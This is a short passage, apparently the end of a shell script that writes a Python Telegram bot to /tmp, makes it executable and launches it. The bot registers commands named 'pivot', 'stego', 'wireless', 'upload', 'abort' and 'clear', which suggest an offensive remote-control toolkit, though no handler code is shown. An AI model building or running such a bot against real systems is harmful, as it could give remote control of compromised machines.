                                ("pivot",pivot),("stego",stego),("wireless",wireless),("report",report),
                                ("upload",upload_file),("log",log),("dashboard",dashboard),("abort",abort),
                                ("watermark",watermark_cmd),("clear",clear)]:
                  app.add_handler(CommandHandler(cmd, func))
              app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
              app.add_handler(InlineQueryHandler(inline_query))
              app.run_polling()
          if __name__ == '__main__':
              main()
          PYEOF
          chmod +x /tmp/telegram_zygor_bot.py
          echo ">>> Launching Telegram bot..."
          python3 /tmp/telegram_zygor_bot.py

